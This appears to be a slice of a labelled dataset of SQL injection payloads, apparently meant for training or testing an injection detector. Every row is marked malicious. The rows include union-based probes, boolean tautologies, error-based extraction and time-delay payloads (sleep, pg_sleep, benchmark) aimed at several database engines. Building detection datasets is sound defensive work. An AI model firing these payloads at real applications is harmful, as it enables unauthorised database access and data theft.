row_index,payload_norm,label,sqli_type_hint
4140,"select * from generate_series ( 9863,9863,case when ( 9863 = 3285 ) then 1 else 0 end ) limit 1--",1,
4141,"1'|| ( select 'yaii' from dual where 7317 = 7317 union all select null,null,null,null,null,null,null,null,null#",1,
4142,"1"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4143,"-5591%"" ) ) order by 1--",1,
4144,1' ) where 4949 = 4949,1,
4145,"1"" ) ) as sqow where 8752 = 8752",1,
4146,"1 ) where 8008 = 8008 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4147,"1"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
4148,"1"" ) as frmp where 6073 = 6073",1,
4149,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1,
4150,-2411 or ( 8459 = 8459 ) *4906# pxwg,1,
4151,"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
4152,"1%"" union all select null,null,null--",1,
4153,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",1,
4154,select ( case when ( 3716 = 4021 ) then 3716 else 3716* ( select 3716 from information_schema.character_sets ) end ) #,1,
4155,"-2111' union all select 1061,1061,1061--",1,
4156,"1"" ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
4157,"-8060"" ) where 5290 = 5290 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,
4158,"-5170' ) ) as ovbf where 4833 = 4833 union all select 4833,4833,4833,4833--",1,
4159,1' where 5103 = 5103,1,
4160,"-8771"" ) ) union all select 6302,6302,6302,6302,6302#",1,
4161,"1, ( select ( case when ( 8640 = 8640 ) then ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 ) ,0 ) ,500000000 ) ,null ) ) ) else 8640/ ( select 0 from information_schema.system_users ) end ) from information_schema.system_users ) --",1,
4162,"-1573"" ) union all select 3928,3928,3928,3928--",1,
4163,1 ) rlike sleep ( 5 ) and ( 5724 = 5724,1,
4164,1 ) where 7096 = 7096,1,
4165,-3166'|| ( select 'mtan' from dual where 9420 = 9420 union all select 9420#,1,
4166,1 ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 3069 = 3069,1,
4167,1 where 4787 = 4787,1,
4168,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,
4169,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",1,
